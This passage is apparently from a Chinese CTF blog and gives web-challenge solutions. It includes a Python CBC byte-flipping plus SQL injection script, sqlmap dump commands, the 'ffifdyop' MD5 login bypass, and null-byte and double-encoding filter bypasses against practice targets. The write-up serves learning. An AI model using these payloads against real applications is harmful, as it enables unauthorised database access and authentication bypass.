OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);\\这里的plain可能有两个值</span><br><span class="line">            $sql=&quot;select * from users limit &quot;.$info[&apos;id&apos;].&quot;,0&quot;;</span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line">            </span><br><span class="line">            if(mysqli_num_rows($result)&gt;0  or die(mysqli_error($link)))&#123;</span><br><span class="line">            	$rows=mysqli_fetch_array($result);</span><br><span class="line">				echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&apos;.$rows[&apos;username&apos;].&apos;&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">			else&#123;</span><br><span class="line">				echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_POST[&apos;id&apos;]))&#123;</span><br><span class="line">    $id = (string)$_POST[&apos;id&apos;];</span><br><span class="line">    if(sqliCheck($id))\\过滤非法参数  </span><br><span class="line">		die(&quot;&lt;h1 style=&apos;color:red&apos;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;);</span><br><span class="line">    $info = array(&apos;id&apos;=&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    echo &apos;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&apos;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    if(isset($_COOKIE[&quot;iv&quot;])&amp;&amp;isset($_COOKIE[&apos;cipher&apos;]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;input id to login&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>遇到的问题</strong>  </p>
<ul>
<li><p>需要进行SQL注入但是遇到了关键字过滤  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>SQL查询是id参数后面如何将后面的,0注释掉  </p>
</li>
<li>见到aes-128-cbc自然想到cbc字节翻转攻击，那么怎么来利用<br><a href="https://www.jianshu.com/p/4c1e5d24d781" target="_blank" rel="noopener">参考文章</a>   </li>
</ul>
<p><strong>解决方法</strong></p>
<ul>
<li>利用%00截断后面的,0 </li>
<li>使用cbc翻转将lnion变为union绕过过滤(CBC翻转 关键在，初始化因子 xor 原文 xor 你想的字符串 得到 更改版的初始化因子)     </li>
</ul>
<h5 id="CBC字节翻转攻击"><a href="#CBC字节翻转攻击" class="headerlink" title="CBC字节翻转攻击"></a><strong>CBC字节翻转攻击</strong></h5><p><a href="http://www.freebuf.com/articles/system/163756.html" target="_blank" rel="noopener">参考文章</a><br>加密过程：<br><img src="http://image.3001.net/images/20180228/15198072135832.png!small" alt="image"><br>Plaintext：明文数据</p>
<p>IV：初始向量</p>
<p>Key：分组加密使用的密钥</p>
<p>Ciphertext：密文数据<br>解密过程：<br>每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。</p>
<p>对于第一组则是与IV进行异或。    </p>
<p>涉及名词：偏移量、php序列化、aes加密、异或</p>
<p><strong>攻击过程：</strong><br><strong>对于解密时</strong>：</p>
<p>设明文为X，密文为Y，解密函数为k。</p>
<p>X[i] = k(Y[i]) Xor Y[i-1]<br><strong>解密第一组时</strong>：</p>
<p>X[1]=k(Y[1]) Xor IV</p>
<p>对于X[i]的解密时，X[i] = k(Y[i]) Xor Y[i-1]，k(Y[i])部分是无法控制的，假如修改Y[i]的值，是无法确定k(Y[i])的值，由于最后是异或操作，因此可以仅修改Y[i-1]的内容为Y’[i-1]来控制最后的明文的值，设解密后的内容为M[i]=k(Y[i]) Xor Y[i-1]。</p>
<p>将Y[i-1]的值设置为Y[i-1] Xor M[i]的值，新的Y[i-1]的值用Y’[i-1]表示。</p>
<p>那么X[i] = k(Y[i]) Xor Y’[i-1]=k(Y[i]) Xor Y[i-1] Xor M[i] = M[i] Xor M[i] = 0</p>
<p>这样就能将只修改Y[i-1]的内容来控制X[i]的值</p>
<p>而此时X[i-1]的值肯定就会出错了，设修改Y[i-1]的值，导致解密后X[i-1]的值为M[i-1]，那么将Y[i-2]的值改为Y[i-2]=Y[i-2] Xor M[i-1] Xor 任意值，可以使得X[i-1]=任意值</p>
<p>这样循环往前，最后一组就是根据M[1]的值修改IV=IV Xor M[1] Xor 任意值，使得X[1]=任意值</p>
<p>对于本题来说，cookie中储存了初始的iv和cipher,我们可以利用bp修改，在本题中也是一样，先获取cipher 对应的cookie，然后字节反转为我们想要的payload，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">cipher=&apos;sZMYZaZsCxj98IedEp83YeaXgk4TtWPbw6D5mhkzP1I%3D&apos;</span><br><span class="line">cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">lst=list(cipher_raw)</span><br><span class="line">idx=4</span><br><span class="line">c1=&apos;2&apos;</span><br><span class="line">c2=&apos;#&apos;</span><br><span class="line">lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">cipher_new=&apos;&apos;.join(lst)</span><br><span class="line">cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">print(cipher_new)</span><br></pre></td></tr></table></figure></p>
<p>这里得到了新的cipher，下面利用返回的密文值和公式 C = A XOR B得到新的iv，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line">__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">iv=&apos;Ko5zoC%2BklAcyqq%2BqihjbwA%3D%3D&apos;</span><br><span class="line">iv_raw=b64decode(urllib.unquote(iv))</span><br><span class="line">first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">plain=b64decode(&apos;g8COFrN/0Z3FDCOZ6MfV5zI6IjEjIjt9&apos;)</span><br><span class="line">iv_new=&apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">iv_new+=chr(ord(plain[i])^ord(first[i])^ord(iv_raw[i]))</span><br><span class="line">iv_new=urllib.quote(b64encode(iv_new))</span><br><span class="line">print iv_new</span><br></pre></td></tr></table></figure></p>
<p>上述的两个脚本就可以修改iv, cipher, 将id=12 的情况变成id=1#，最后的查询脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf8 -*-</span><br><span class="line"># 请保留我的个人信息，谢谢~！</span><br><span class="line">__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"># 解码base64，获得iv,cipher的加密值</span><br><span class="line">def mydecode(value):</span><br><span class="line">return b64decode(urllib.unquote(value))</span><br><span class="line"># 转码</span><br><span class="line">def myencode(value):</span><br><span class="line">return urllib.quote(b64encode(value))</span><br><span class="line"># 字节反转：将指定偏移量的字符转换为新的字符</span><br><span class="line">def mycbc(value,idx,c1,c2):</span><br><span class="line">lst=list(value)</span><br><span class="line">lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">return &apos;&apos;.join(lst)</span><br><span class="line"># 提交payload，获取cookie，并将cookie 解密为iv，cipher，再使用字节反转攻击，使得sql 查询能够成功</span><br><span class="line">def pcat(payload,idx,c1,c2):</span><br><span class="line">url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">myd=&#123;&apos;id&apos;:payload&#125;</span><br><span class="line">res=requests.post(url,data=myd)</span><br><span class="line">cookies=res.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">iv=re.findall(r&apos;iv=(.*?),&apos;,cookies)[0]</span><br><span class="line">cipher=re.findall(r&apos;cipher=(.*)&apos;,cookies)[0]</span><br><span class="line">iv_raw=mydecode(iv)</span><br><span class="line">cipher_raw=mydecode(cipher)  </span><br><span class="line"># 字节反转，先转换cipher，得到aes加密的密文(非base64加密后得值)，再利用异或，求出随机生成得iv</span><br><span class="line">cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))</span><br><span class="line">cookies_new=&#123;&apos;iv&apos;:iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">plain=b64decode(re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;,cont)[0])</span><br><span class="line">first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">iv_new=&apos;&apos;</span><br><span class="line">for i in range(16):</span><br><span class="line">iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">iv_new=myencode(iv_new)</span><br><span class="line"># 得到源码生产的随机值iv 和aes 加密得cipher，并且plain 明文在cbc字节反转下可控</span><br><span class="line">cookies_new=&#123;&apos;iv&apos;:iv_new,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">print &apos;Payload:%s\n&gt;&gt; &apos; %(payload)</span><br><span class="line">print cont</span><br><span class="line">pass</span><br><span class="line"># 不断带入构造好的sql 语句，得到返回结果即可</span><br><span class="line">def foo():</span><br><span class="line">pcat(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">pcat(&apos;0 2nion select * from((select 1)a join (select 2)b join (select</span><br><span class="line">3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pcat(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from</span><br><span class="line">information_schema.tables where table_schema regexp database())b join (select</span><br><span class="line">3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from</span><br><span class="line">information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select</span><br><span class="line">3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join</span><br><span class="line">(select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">pass</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">foo()</span><br><span class="line">print &apos;ok&apos;</span><br></pre></td></tr></table></figure></p>
<h4 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h4><p>查看源码发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- $password=$_POST[&apos;password&apos;];</span><br><span class="line">	$sql = &quot;SELECT * FROM admin WHERE username = &apos;admin&apos; and password = &apos;&quot;.md5($password,true).&quot;&apos;&quot;;</span><br><span class="line">	$result=mysqli_query($link,$sql);</span><br><span class="line">		if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">			echo &apos;flag is :&apos;.$flag;</span><br><span class="line">		&#125;</span><br><span class="line">		else&#123;</span><br><span class="line">			echo &apos;密码错误!&apos;;</span><br><span class="line">		&#125; --&gt;</span><br></pre></td></tr></table></figure></p>
<p>密码是经过md5哈希加密的，不懂网上查了一下，脑洞题，密码<img src="https://img-blog.csdn.net/20180324215047728" alt="image">中的ffifdyop   </p>
<h4 id="上传绕过"><a href="#上传绕过" class="headerlink" title="上传绕过"></a>上传绕过</h4><p>随便上传一个png图片<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry43htcz8j30eu05ct9c.jpg" alt="image"><br>那上传一个PHP喃<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fry45loq5uj30k502idfv.jpg" alt="image"><br>在上传绕过里最有名的的就是00截断，那么我们就先要抓包<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4a9zjkjj30zc0bxwfk.jpg" alt="image">   </p>
<p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4fmdsgwj30zv0bljt5.jpg" alt="image"></p>
<p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fry4gn71u3j3121096jsx.jpg" alt="image">   </p>
<h4 id="Once-More"><a href="#Once-More" class="headerlink" title="Once More"></a>Once More</h4><p>提示：科学计数法<br>源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset ($_GET[&apos;password&apos;])) &#123;</span><br><span class="line">	if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&apos;password&apos;]) === FALSE)</span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else if (strlen($_GET[&apos;password&apos;]) &lt; 8 &amp;&amp; $_GET[&apos;password&apos;] &gt; 9999999)</span><br><span class="line">	&#123;</span><br><span class="line">		if (strpos ($_GET[&apos;password&apos;], &apos;*-*&apos;) !== FALSE)</span><br><span class="line">		&#123;</span><br><span class="line">			die(&apos;Flag: &apos; . $flag);</span><br><span class="line">		&#125;</span><br><span class="line">		else</span><br><span class="line">		&#123;</span><br><span class="line">			echo(&apos;&lt;p&gt;*-* have not been found&lt;/p&gt;&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;p&gt;Invalid password&lt;/p&gt;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>一道代码审计题，根据if语句要求，password必须大于9999999，但是长度小于8，而且还要等于<em>-</em><br>根据提示科学计数法，再利用%00截断，因为ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配，构造password=1e8%00<em>-</em><br>另一种方法也是利用题目中的函数遇到数字会返回NULL来绕过<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fry4s56ahaj30w108jt9v.jpg" alt="image">   </p>
<h4 id="程序逻辑问题"><a href="#程序逻辑问题" class="headerlink" title="程序逻辑问题"></a>程序逻辑问题</h4><p>查看源码发现index.txt文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[user] &amp;&amp; $_POST[pass]) &#123;</span><br><span class="line">	$conn = mysql_connect(&quot;********, &quot;*****&quot;, &quot;********&quot;);</span><br><span class="line">	mysql_select_db(&quot;phpformysql&quot;) or die(&quot;Could not select database&quot;);</span><br><span class="line">	if ($conn-&gt;connect_error) &#123;</span><br><span class="line">		die(&quot;Connection failed: &quot; . mysql_error($conn));</span><br><span class="line">&#125; </span><br><span class="line">$user = $_POST[user];</span><br><span class="line">$pass = md5($_POST[pass]);</span><br><span class="line"></span><br><span class="line">$sql = &quot;select pw from php where user=&apos;$user&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql);</span><br><span class="line">if (!$query) &#123;</span><br><span class="line">	printf(&quot;Error: %s\n&quot;, mysql_error($conn));</span><br><span class="line">	exit();</span><br><span class="line">&#125;</span><br><span class="line">$row = mysql_fetch_array($query, MYSQL_ASSOC);</span><br><span class="line">//echo $row[&quot;pw&quot;];</span><br><span class="line">  </span><br><span class="line">  if (($row[pw]) &amp;&amp; (!strcasecmp($pass, $row[pw]))) &#123;</span><br><span class="line">	echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);</span><br><span class="line">	</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>根据源码可以看到两处特别需要重视的地方，很明显该sql语句存在注入漏洞，但是密码栏不能通过一般的注入来绕过，但是可以发现，只要满足了（$row[pw]) &amp;&amp;(!strcasecmp($pass,$row[pw])就可以拿到flag，也就是说，我们输入的$pass与从数据库取出来的pw一致就行，我们可以控制$pass的值，但是貌似不知道数据库中pw的值，但是我们可以直接用union select ‘某一个经过md5加密后的字符串’#来自己随意设定密码，注意这里一定是经过md5加密，不然会出错。  </p>
<p>构造语句:’ and 0=1 union select ‘529CA8050A00180790CF88B63468826A’#</p>
<p>密码：hehe</p>
<p>就拿到flag了。  </p>
<h4 id="php大法"><a href="#php大法" class="headerlink" title="php大法"></a>php大法</h4><p>页面提示：index.php.txt<br>打开得到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;\\get传参的id值不能等于hackerDJ</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;/p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] = urldecode($_GET[id]);\\对id值进行一次解码</span><br><span class="line">if($_GET[id] == &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;/p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;/p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure></p>
<p>值得一提的是我们在网页输入url时已经进行了一次url解码，所以这里解码了两次得到的hackerDJ，所以我们传入的原始值应该是两次url编码后的hackerDJ<br>构造url: index.php?id=%2568ackerDJ<br>flag: DUTCTF{PHP_is_the_best_program_language}</p>
<h4 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h4><p>打开链接后显示：<br><img src="http://t.cn/R1HUSzY" alt="image"><br>发现只有一个输入框，什么也没有，查看源代码，发现有一个隐藏的输入框：<br><img src="http://t.cn/R1HUWvF" alt="image"><br>这时按F12，修改type=”hidden”为”text”后就能看到输入框了，其中value=0,这时候还是不知道另外一个输入框该填什么，然后试着修改了一下value的值，令value=1,再提交一下，就看到进一步的提示了：<br><img src="http://t.cn/R1HUe2a" alt="image"><br>这时复制pin值到输入框里就拿到flag  </p>
<h4 id="简单的SQL注入2"><a href="#简单的SQL注入2" class="headerlink" title="简单的SQL注入2"></a>简单的SQL注入2</h4><p>试着先输入1，再输入1’，页面报语法错误，再输入1 ‘页面出现SQLi detected!，推出空格被它过滤了<br>用SQLmap跑一下<br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –dbs<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryaa78kycj30b4022741.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –tables -D web1<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryab0jtbaj30b601x0nc.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_2.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_2.php?id=1</a> –tamper=space2comment –dump -C flag -T flag -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg" alt="image"></p>
<h4 id="简单的SQL注入3"><a href="#简单的SQL注入3" class="headerlink" title="简单的SQL注入3"></a>简单的SQL注入3</h4><p>输入1，页面显示hello，输入1’，页面报错<br>sqlmap跑起来<br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –dbs<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryafzy505j30f5023dfl.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –tables -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryahgdnsjj30aw02i741.jpg" alt="image"><br>sqlmap.py -u <a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a> –dump -C flag -T flag -D web1<br><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1fryabuhti5j30a602c741.jpg" alt="image"></p>
<h4 id="简单的SQL注入"><a href="#简单的SQL注入" class="headerlink" title="简单的SQL注入"></a>简单的SQL注入</h4><p>这道题也是sql注入，输入1，页面显示正常，输出1’，页面报错</p>
<p>之后通过输入查表字段，发现union select 被过滤了,这是想到用两个union表示</p>
<p>重复输入union select后发现空格也被过滤了，继续用两个空格代替一个空格<br>1.查询当前数据库</p>
<p>1’  unionunion  selectselect  database()’  </p>
<p>2.查询数据库中的表</p>
<p>1’  unionunion  selectselect  table_name  fromfrom  information_schema.tables  wherewhere  ‘1’=’1  </p>
<p>3.查询字段名</p>
<p>1’ unionunion  selectselect  column_namcolumn_namee  fromfrom  information_schema.coluinformation_schema.columnsmns  wherewhere  table_name=’flag   </p>
<p>4.最后构造出1’  unionunion  selectselect  flag  fromfrom  flag  wherewhere  ‘1’=’1<br><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1fryamkr5hwj30kp062aab.jpg" alt="image"> </p>
<h4 id="你真的会PHP吗？"><a href="#你真的会PHP吗？" class="headerlink" title="你真的会PHP吗？"></a>你真的会PHP吗？</h4><p>抓包发现提示：<br><img src="http://wx3.sinaimg.cn/mw690/0060lm7Tly1fryark9iifj30zu07jmy9.jpg" alt="image"><br>hint:6c525af4059b4fe7d8c33a.txt<br>打开发现源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$info = &quot;&quot;; </span><br><span class="line">$req = [];</span><br><span class="line">$flag=&quot;xxxxxxxxxx&quot;;</span><br><span class="line"></span><br><span class="line">ini_set(&quot;display_error&quot;, false); </span><br><span class="line">error_reporting(0); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_POST[&apos;number&apos;]))&#123;</span><br><span class="line">   